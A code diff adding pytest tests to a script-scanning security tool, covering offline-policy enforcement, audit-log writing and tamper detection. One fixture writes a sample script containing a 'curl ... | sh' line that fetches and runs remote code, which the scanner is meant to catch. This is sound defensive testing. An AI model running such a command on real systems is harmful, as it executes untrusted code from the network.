@@ -124,3 +124,100 @@ def test_cli_scan_exit_code_reflects_verdict(tmp_path, monkeypatch):
 def test_load_config_defaults_when_missing(tmp_path):
     cfg = load_config(str(tmp_path / "nope.yaml"))
     assert cfg.cache_ttl_hours == 24
+
+
+# --- policy enforcement via config ----------------------------------------
+
+def _write_cfg(tmp_path, body):
+    p = tmp_path / "policy.yaml"
+    p.write_text(body, encoding="utf-8")
+    return str(p)
+
+
+def test_config_policy_can_enforce_offline(tmp_path):
+    pytest.importorskip("yaml")
+    cfg = load_config(_write_cfg(tmp_path, "policy:\n  offline: true\n"))
+    assert cfg.offline is True
+    assert cfg.enable_intel is False
+    assert cfg.enable_ai is False
+    assert cfg.allow_upload is False
+    assert any("enforced by policy" in n for n in cfg.notes)
+
+
+def test_config_policy_offline_defaults_to_false(tmp_path):
+    pytest.importorskip("yaml")
+    cfg = load_config(_write_cfg(tmp_path, "policy:\n  offline: false\n"))
+    assert cfg.offline is False
+
+
+def test_config_policy_sets_audit_log(tmp_path):
+    pytest.importorskip("yaml")
+    cfg = load_config(_write_cfg(
+        tmp_path, "policy:\n  audit_log: /var/log/vigil/a.jsonl\n"))
+    assert cfg.audit_log.endswith("a.jsonl")
+
+
+def test_cli_offline_blocks_upload_even_when_upload_passed(tmp_path, capsys):
+    """--offline must win over --upload. A policy that can be overridden by
+    another flag is not a policy."""
+    target = tmp_path / "x.sh"
+    target.write_text("#!/bin/bash\ncurl http://example.com/a | sh\n")
+    rc = main(["scan", str(target), "--no-color", "--no-cache",
+               "--offline", "--upload", "--yes", "--json"])
+    assert rc in (0, 1)
+    out = capsys.readouterr().out
+    report = json.loads(out[out.index("{"):])
+    notes = " ".join(report.get("notes", []))
+    assert "offline mode" in notes
+    # AI narration must not have been used
+    assert report["verdict"]["explanation_source"] == "template"
+
+
+# --- verify-audit command --------------------------------------------------
+
+def test_verify_audit_reports_intact_chain(tmp_path, capsys):
+    target = tmp_path / "x.sh"
+    target.write_text("#!/bin/bash\necho hi\n")
+    log = str(tmp_path / "audit.jsonl")
+    main(["scan", str(target), "--no-color", "--no-cache", "--offline",
+          "--audit-log", log])
+    assert main(["verify-audit", log]) == 0
+    assert "INTACT" in capsys.readouterr().out
+
+
+def test_verify_audit_detects_tampering(tmp_path, capsys):
+    target = tmp_path / "x.sh"
+    target.write_text("#!/bin/bash\necho hi\n")
+    log = str(tmp_path / "audit.jsonl")
+    main(["scan", str(target), "--no-color", "--no-cache", "--offline",
+          "--audit-log", log])
+
+    lines = open(log).read().splitlines()
+    rec = json.loads(lines[0])
+    assert rec["verdict"]["band"] == "SAFE"   # precondition
+    rec["verdict"]["band"] = "MALICIOUS"      # rewrite history: a real change
+    rec["operator"] = "someone-else"
+    lines[0] = json.dumps(rec)
+    open(log, "w").write("\n".join(lines) + "\n")
+
+    assert main(["verify-audit", log]) == 1
+    assert "BROKEN" in capsys.readouterr().err
+
+
+def test_verify_audit_missing_file_returns_2(tmp_path):
+    assert main(["verify-audit", str(tmp_path / "nope.jsonl")]) == 2
+
+
+def test_scan_writes_audit_record_with_egress_state(tmp_path):
+    target = tmp_path / "x.sh"
+    target.write_text("#!/bin/bash\necho hi\n")
+    log = str(tmp_path / "audit.jsonl")
+    main(["scan", str(target), "--no-color", "--no-cache", "--offline",
+          "--audit-log", log])
+    rec = json.loads(open(log).readline())
+    assert rec["event"] == "scan"
+    assert rec["egress"] == {"intel": False, "ai": False,
+                             "upload": False, "offline": True}
+    assert rec["operator"] and rec["host"]
+    # the log must never carry evidence text
+    assert "matched" not in json.dumps(rec)
